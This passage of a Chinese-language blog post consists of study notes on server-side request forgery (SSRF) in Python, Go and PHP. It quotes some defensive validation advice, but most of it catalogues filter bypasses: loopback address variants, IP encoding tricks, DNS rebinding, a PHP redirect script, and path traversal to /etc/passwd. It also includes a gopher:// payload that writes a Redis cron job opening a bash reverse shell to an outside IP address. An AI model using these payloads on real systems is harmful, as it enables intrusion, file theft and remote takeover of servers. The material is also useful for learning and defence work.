<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662905905704-7222cc38-0476-4eda-87d1-13574a08f621.png" alt="image.png"></p>
<p>记得国赛有道题patch就是把 urllib.urlopen改查request.get ….</p>
<h4 id="pycurl"><a href="#pycurl" class="headerlink" title="pycurl"></a>pycurl</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_27378621/article/details/103606221/">python2.7安装pycurl_Janebook的博客-CSDN博客</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> pycurl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pycurl</span></span><br><span class="line">c = pycurl.Curl()</span><br><span class="line">c.setopt(c.URL, <span class="string">&#x27;file://C:/Windows/win.ini&#x27;</span>)</span><br><span class="line">c.setopt(c.FOLLOWLOCATION, <span class="number">1</span>)</span><br><span class="line">c.setopt(c.MAXREDIRS, <span class="number">5</span>)</span><br><span class="line">c.setopt(c.CONNECTTIMEOUT, <span class="number">60</span>)</span><br><span class="line"><span class="built_in">print</span>(c.perform())</span><br><span class="line">c.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662909070324-ad7bda2a-b1d3-4fad-bcf1-936cd6d12a4b.png" alt="image.png"></p>
<p><strong>python ssrf的修复</strong><br>去hook下<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html">https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html</a></p>
<h3 id="go"><a href="#go" class="headerlink" title="go"></a>go</h3><p>go的例子很少很少，可以参考下腾讯的代码安全指南，同时也写了SSRF的修复，但毕竟是开发角度，能看的东西不多，重点关注net库。<br><a target="_blank" rel="noopener" href="https://github.com/Tencent/secguide/blob/main/Go%E5%AE%89%E5%85%A8%E6%8C%87%E5%8D%97.md">secguide&#x2F;Go安全指南.md at main · Tencent&#x2F;secguide</a></p>
<ul>
<li>使用”net&#x2F;http”下的方法http.Get(url)、http.Post(url, contentType, body)、http.Head(url)、http.PostForm(url, data)、http.Do(req)时，如变量值外部可控（指从参数中动态获取），应对请求目标进行严格的安全校验。</li>
<li>如请求资源域名归属固定的范围，如只允许a.qq.com和b.qq.com，应做白名单限制。如不适用白名单，则推荐的校验逻辑步骤是：<ul>
<li>第 1 步、只允许HTTP或HTTPS协议</li>
<li>第 2 步、解析目标URL，获取其HOST</li>
<li>第 3 步、解析HOST，获取HOST指向的IP地址转换成Long型</li>
<li>第 4 步、检查IP地址是否为内网IP，网段有：&#x2F;&#x2F; 以RFC定义的专有网络为例，如有自定义私有网段亦应加入禁止访问列表。 10.0.0.0&#x2F;8 172.16.0.0&#x2F;12 192.168.0.0&#x2F;16 127.0.0.0&#x2F;8 </li>
<li>第 5 步、请求URL</li>
<li>第 6 步、如有跳转，跳转后执行1，否则绑定经校验的ip和域名，对URL发起请求</li>
</ul>
</li>
</ul>
<h4 id="net-x2F-http"><a href="#net-x2F-http" class="headerlink" title="net&#x2F;http"></a>net&#x2F;http</h4><ul>
<li>使用”net&#x2F;http”下的方法http.Get(url)、http.Post(url, contentType, body)、http.Head(url)、http.PostForm(url, data)、http.Do(req)时，如变量值外部可控（指从参数中动态获取），应对请求目标进行严格的安全校验。</li>
</ul>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    resp, err := http.Get(<span class="string">&quot;http://127.0.0.1&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">    body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line">    fmt.Println(<span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662964713098-500ed322-387a-4ff4-baa2-ca161db9e6a6.png" alt="image.png"></p>
<p>其他后面再补</p>
<p>go ssrf判断，修复<br><a target="_blank" rel="noopener" href="https://jishuin.proginn.com/p/763bfbd76968">Go中的SSRF攻防战-技术圈</a></p>
<h3 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h3><p>后面再补,后面看看搞搞nodejs的代码审计，利用面比其他语言要小很多</p>
<h2 id="SSRF常见绕过"><a href="#SSRF常见绕过" class="headerlink" title="SSRF常见绕过"></a>SSRF常见绕过</h2><p>一般修复最好是黑名单加白名单<br>这个看环境，一般来说不太需要绕，要么有漏洞，要么没有，正确修复SSRF，是不会有漏洞的。</p>
<h3 id="本地回环地址的其他表现形式"><a href="#本地回环地址的其他表现形式" class="headerlink" title="本地回环地址的其他表现形式"></a><strong>本地回环地址的其他表现形式</strong></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1</span></span><br><span class="line">http:<span class="comment">//localhost</span></span><br><span class="line">http:<span class="comment">//127.255.255.254     #CIDR     127.0.0.1 - 127.255.255.254</span></span><br><span class="line">http:<span class="comment">//[::1]</span></span><br><span class="line">http:<span class="comment">//[::ffff:7f00:1]</span></span><br><span class="line">http:<span class="comment">//[::ffff:127.0.0.1]</span></span><br><span class="line">http:<span class="comment">//127.1</span></span><br><span class="line">http:<span class="comment">//127.0.1</span></span><br><span class="line">http:<span class="comment">//0:80</span></span><br><span class="line">http:<span class="comment">//0/                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1</span></span><br><span class="line">http:<span class="comment">//0.0.0.0/           # 0.0.0.0这个IP地址表示整个网络，可以代表本机 ipv4 的所有地址</span></span><br><span class="line">http:<span class="comment">//[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行</span></span><br><span class="line">http:<span class="comment">//[::]:80/                       # 在liunx下可用，window测试了下不行</span></span><br><span class="line">http:<span class="comment">//127.00000.00000.001/           # 0的数量多一点少一点都没影响，最后还是会指向</span></span><br><span class="line">::<span class="number">1</span></span><br><span class="line">http:<span class="comment">//devd.io                   //以下域名均解析到127.0.0.1</span></span><br><span class="line">https:<span class="comment">//localtest.me/ 	</span></span><br><span class="line">http:<span class="comment">//localhost.sec.qq.com/	</span></span><br><span class="line">http:<span class="comment">//lvh.me/				</span></span><br><span class="line">http:<span class="comment">//strikingly.io/</span></span><br><span class="line">http:<span class="comment">//imis.qq.com/</span></span><br><span class="line">http:<span class="comment">//safe.taobao.com/</span></span><br><span class="line">http:<span class="comment">//114.taobao.com/</span></span><br><span class="line">http:<span class="comment">//ecd.tencent.com/</span></span><br><span class="line">http:<span class="comment">//wifi.aliyun.com/</span></span><br><span class="line">http:<span class="comment">//0</span></span><br></pre></td></tr></table></figure>


<h3 id="添加-绕过"><a href="#添加-绕过" class="headerlink" title="添加@绕过"></a>添加@绕过</h3><p>平常我们传入的url是<code>url=http://127.0.0.1:8888</code>，如果<br>我们传入的url是<code>url=http://qqqqq.com@127.0.0.1:8888</code>,它此时依旧会访问127.0.0.1<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661957643468-3cd96177-fe5e-4a37-91a3-bed18b399dec.png" alt="image.png"></p>
<h3 id="302跳转-dns解析（这种得支持重定向）"><a href="#302跳转-dns解析（这种得支持重定向）" class="headerlink" title="302跳转,dns解析（这种得支持重定向）"></a>302跳转,dns解析（这种得支持重定向）</h3><p>网络上存在一个名为sudo.cc的服务，放访问这个服务时，会自动重定向到127.0.0.1<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662472592553-e7cffa4b-cae3-4621-bd23-b2e070f91d40.png" alt="image.png"><br>类似的还有<br><a target="_blank" rel="noopener" href="https://sslip.io/">https://sslip.io/</a><br><a target="_blank" rel="noopener" href="https://nip.io/">https://nip.io/</a><br>当然自己写也可<br>比如 302.php</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="type">php</span>  </span><br><span class="line"><span class="variable">$schema</span> <span class="operator">=</span> $_GET[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line">$ip     = $_GET[<span class="string">&#x27;i&#x27;</span>];</span><br><span class="line">$port   = $_GET[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line">$query  = $_GET[<span class="string">&#x27;q&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(empty($port))&#123;  </span><br><span class="line">    header(<span class="string">&quot;Location: $schema://$ip/$query&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: $schema://$ip:$port/$query&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后访问之</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#dict protocol - 探测Redis</span><br><span class="line">dict:<span class="comment">//127.0.0.1:6379/info  </span></span><br><span class="line">curl -vvv <span class="string">&#x27;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=dict&amp;i=127.0.0.1&amp;port=6379&amp;query=info&#x27;</span></span><br><span class="line"> file protocol - 任意文件读取</span><br><span class="line">curl -vvv <span class="string">&#x27;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=file&amp;query=/etc/passwd&#x27;</span></span><br><span class="line">#gopher protocol - 一键反弹Bash</span><br><span class="line">注意: gopher跳转的时候转义和`url`入参的方式有些区别</span><br><span class="line">curl -vvv <span class="string">&#x27;http://sec.com:8082/ssrf_only_http_s.php?url=http://sec.com:8082/302.php?s=gopher&amp;i=127.0.0.1&amp;p=6389&amp;query=_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0 </span></span><br><span class="line"><span class="string">a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20/dev/tcp/103.21.140.84/6789%200&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d  </span></span><br><span class="line"><span class="string">%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3</span></span><br><span class="line"><span class="string">%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="利用其他协议绕过"><a href="#利用其他协议绕过" class="headerlink" title="利用其他协议绕过"></a>利用其他协议绕过</h3><p>file协议等等，前面有介绍<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662473204352-edf1ac97-6e53-452e-a402-bc77883e409a.png" alt="image.png"></p>
<h3 id="利用Enclosed-alphanumerics绕过"><a href="#利用Enclosed-alphanumerics绕过" class="headerlink" title="利用Enclosed alphanumerics绕过"></a>利用Enclosed alphanumerics绕过</h3><p>利用Enclosed alphanumerics<br>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; <a target="_blank" rel="noopener" href="http://example.com/">http://example.com</a><br>List:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>

<p>eg：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>②<span class="number">7.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>
<p>linux可行，windows不太行<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662473343708-a08796a3-4b36-4913-9816-3059f24b7c84.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662473488475-42395ba8-3fdf-4b6f-81b0-eba1f50d70ea.png" alt="image.png"></p>
<h3 id="句号替代-绕过"><a href="#句号替代-绕过" class="headerlink" title="句号替代.绕过"></a>句号替代.绕过</h3><p>linux可行，win不太行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i <span class="number">127</span>。<span class="number">0</span>。<span class="number">0.1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662473596421-4220e1e8-1243-45bc-b85a-a54ee0e58cd9.png" alt="image.png"></p>
<h3 id="省略中间的0"><a href="#省略中间的0" class="headerlink" title="省略中间的0"></a>省略中间的0</h3><p>当过滤127.0.0.1整体时，还有一种绕过方式就是省略中间的0，这个时候也是可以访问的<br>win,linux都可<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662473705848-8684e19e-a3d8-40f4-870c-bbd40854e06c.png" alt="image.png"></p>
<h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><p>将127.0.0.1进行转换，转换为其他进制的数从而绕过检测<br>进制转换结果如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0177.0</span><span class="number">.0</span><span class="number">.1</span> <span class="comment">//八进制</span></span><br><span class="line"><span class="number">0x7f</span><span class="number">.0</span><span class="number">.0</span><span class="number">.1</span> <span class="comment">//十六进制</span></span><br><span class="line"><span class="number">2130706433</span> <span class="comment">//十进制</span></span><br></pre></td></tr></table></figure>
<p>对于这种过滤我们可以采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址我们可以改写成：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>                    </span><br><span class="line">(<span class="number">1</span>)、<span class="number">8</span>进制格式：<span class="number">0300.0250</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">(<span class="number">2</span>)、<span class="number">16</span>进制格式：<span class="number">0xC0</span>.<span class="number">0xA8</span><span class="number">.0</span><span class="number">.1</span>  </span><br><span class="line">(<span class="number">3</span>)、<span class="number">10</span>进制整数格式：<span class="number">3232235521</span></span><br><span class="line">(<span class="number">4</span>)、<span class="number">16</span>进制整数格式：<span class="number">0xC0A80001</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>类型原因举例</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">点分十进制IP地址：http:<span class="comment">//216.58.199.78</span></span><br><span class="line">八进制IP地址：http:<span class="comment">//0330.0072.0307.0116（将每个十进制数字转换为八进制）</span></span><br><span class="line">十六进制IP地址：http:<span class="comment">//0xD83AC74E</span></span><br><span class="line">http:<span class="comment">//0xD8.0x3A.0xC7.0x4E（将每个十进制数字转换为十六进制）</span></span><br><span class="line">整数或DWORD IP地址：http:<span class="comment">//3627730766（将十六进制IP转换为整数）</span></span><br></pre></td></tr></table></figure>


<p>也可以利用php转换脚本来直接得到结果，脚本如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="type">php</span></span><br><span class="line"><span class="variable">$ip</span> <span class="operator">=</span> <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">$ip = explode(<span class="string">&#x27;.&#x27;</span>,$ip);</span><br><span class="line">$r = ($ip[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | ($ip[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | ($ip[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | $ip[<span class="number">3</span>] ;</span><br><span class="line"><span class="keyword">if</span>($r &lt; <span class="number">0</span>) &#123;</span><br><span class="line">$r += <span class="number">4294967296</span>;</span><br><span class="line">&#125;</span><br><span class="line">echo <span class="string">&quot;十进制:&quot;</span>;</span><br><span class="line">echo $r;</span><br><span class="line">echo <span class="string">&quot;八进制:&quot;</span>;</span><br><span class="line">echo <span class="title function_">decoct</span><span class="params">($r)</span>;</span><br><span class="line">echo <span class="string">&quot;十六进制:&quot;</span>;</span><br><span class="line">echo <span class="title function_">dechex</span><span class="params">($r)</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662473984198-3112558c-d6a3-46cf-925f-a4d299208ac7.png" alt="image.png"></p>
<h3 id="特殊0"><a href="#特殊0" class="headerlink" title="特殊0"></a>特殊0</h3><p>在windows中，0代表0.0.0.0，而在linux下，0代表127.0.0.1，如下所示<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662474056772-7a8e871f-37dc-4681-ae7e-83d207d605b2.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662474061130-026ce8bd-1a60-4579-a19d-cf6de5185e73.png" alt="image.png"></p>
<h3 id="用-绕过localhost"><a href="#用-绕过localhost" class="headerlink" title="用[::]绕过localhost"></a>用[::]绕过localhost</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//[::]:80/</span></span><br><span class="line">http:<span class="comment">//0000::1:80/</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662474540746-5e507fd5-fd5f-422a-90a4-e497b97af16c.png" alt="image.png"></p>
<h3 id="ipv6"><a href="#ipv6" class="headerlink" title="ipv6"></a>ipv6</h3><p>即使目标没有连入IPv6网络，但本地系统、内网通常是支持IPv6的，所以不是说没有IPv6外网IP的目标就不能用IPv6的技巧进行测试。<br>这个点知道了就差不多懂了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i ip6-localhost</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662475439503-14d10b44-dd1b-4945-bcf1-64e2a4efb23e.png" alt="image.png"><br>可以看P牛这篇<br><a target="_blank" rel="noopener" href="http://tttang.com/archive/1293/">IPv6 三个访问本地地址的小Tips - 跳跳糖</a></p>
<h3 id="短网址缩短"><a href="#短网址缩短" class="headerlink" title="短网址缩短"></a>短网址缩短</h3><p>本质也是302跳转，没什么好说的<br>网上有很多将网址转换未短网址的网站。</p>
<h3 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h3><p><a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a><br><a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io/</a><br>dns重绑定这个比较有意思<br>DNS是Domain Name Service的缩写,计算机域名服务器,在Internet上域名与IP地址之间是一一对应的，域名虽然便于人们记忆，但机器之间只能互相认识IP地址，它们之间的转换工作称为域名解析，而域名解析需要由专门的域名解析服务器来完成，这就是DNS域名服务器。<br>在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户<strong>第一次访问，解析域名获取一个IP地址</strong>；然后，域名持有者<strong>修改对应的IP地址</strong>；用户<strong>再次请求该域名，就会获取一个新的IP地址。</strong>对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS 重绑定攻击。<br>因为用户端会发起两次请求，所有域名持有者可以修改，也即<strong>在第一次校验IP的时候返回一个合法的IP，在真实发起请求的时候，返回我们真正想要访问的内网IP即可。</strong> </p>
<h4 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h4><p>对于用户请求的URL参数，<strong>首先服务器端会对其进行DNS解析</strong>，然后<strong>对于DNS服务器返回的IP地址进行判断</strong>，如果在黑名单中，就pass掉。<br>但是在整个过程中，<strong>第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，我们可以进行DNS 重绑定攻击</strong>。我们利用DNS Rebinding技术，<strong>在第一次校验IP的时候返回一个合法的IP，在真实发起请求的时候，返回我们真正想要访问的内网IP即可。</strong><br>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，<strong>设置TTL时间为0，这是为了防止有DNS服务器对解析结果进行缓存</strong>。这样就可以进行攻击了，完整的攻击流程为：<br>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP<br>对于获得的IP进行判断，发现为非黑名单IP，则通过验证<br>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。<br>DNS重绑定这里简单的说就是我们先提供一个ip，然后在服务端进行解析的过程中再传127.0.0.1，此时就可能会出现访问到本地文件的情况<br>举个栗子，我们设置一个为127.0.0.1，另一个随便写一下<br>[<img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662642295605-83015f2b-702b-43c3-a82d-de4baaa629e2.png" alt="image.png"><br>ping这个地址，可以发现有两种情况，一种是1.1.1.14，另一种是127.0.0.1<br>[<img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662642295699-51bc09cd-26b8-413f-a801-8b458893d619.png" alt="image.png"><br>主要是ttl为0问题，阿里云默认大于10min</p>
<h4 id="使用国外服务器进行设置"><a href="#使用国外服务器进行设置" class="headerlink" title="使用国外服务器进行设置"></a>使用国外服务器进行设置</h4><p>一些国外的服务器是允许TTL为0的，自行搜索</p>
<h4 id="ceye-io"><a href="#ceye-io" class="headerlink" title="ceye.io"></a>ceye.io</h4><p>该网站直接有该功能，可以直接使用</p>
<h4 id="对统一域名设置两个A记录"><a href="#对统一域名设置两个A记录" class="headerlink" title="对统一域名设置两个A记录"></a>对统一域名设置两个A记录</h4><p>可以对同一个域名设置两个A记录（一个内网、一个外网），这样会random访问两条记录中的一个。但是随机性比较强，不是一定能成功的，需要多次尝试<br><a target="_blank" rel="noopener" href="https://joychou.org/java/use-dnsrebinding-to-bypass-ssrf-in-java.html">Use DNS Rebinding to Bypass SSRF in JAVA - 贫民窟的艺术家</a><br>给出大哥的总结</p>
<ul>
<li>Java默认不存在被DNS Rebinding绕过风险（TTL默认为10）</li>
<li>PHP默认会被DNS Rebinding绕过</li>
<li>Linux默认不会进行DNS缓存</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40003478/article/details/111291530">内网dns转发请求被拒绝_浅谈DNS重绑定漏洞_weixin_40003478的博客-CSDN博客</a></p>
<h3 id="利用不存在的协议头绕过指定的协议头"><a href="#利用不存在的协议头绕过指定的协议头" class="headerlink" title="利用不存在的协议头绕过指定的协议头"></a>利用不存在的协议头绕过指定的协议头</h3><p>file_get_contents() 函数的一个特性，即当PHP的 file_get_contents() 函数在遇到不认识的协议头的时候会将整个协议头当作<strong>文件夹</strong>，造成目录穿越漏洞，这时候只需要不断往上跳转目录即可读取到根目录的文件（include()也有这个特定）<br>测试代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span><span class="params">(__FILE__)</span>;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^https/is&#x27;</span>,$_GET[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    die(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">echo <span class="title function_">file_get_contents</span><span class="params">($_GET[<span class="string">&#x27;url&#x27;</span>])</span>;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上面的代码限制了 url 只能是以 https 开头的路径，那么我们就可以：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpsssssss:<span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>此时file_get_contents() 函数遇到了不认识的伪协议头 “httpssssssss:&#x2F;&#x2F;”，就会把他当作文件夹，然后再配合目录穿越即可读取文件：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssrf.php?url=httpsssss:<span class="comment">//../../../../../../etc/passwd </span></span><br><span class="line">ssrf.php?url=httpsssss:<span class="comment">//abc../../../../../../etc/passwd </span></span><br></pre></td></tr></table></figure>
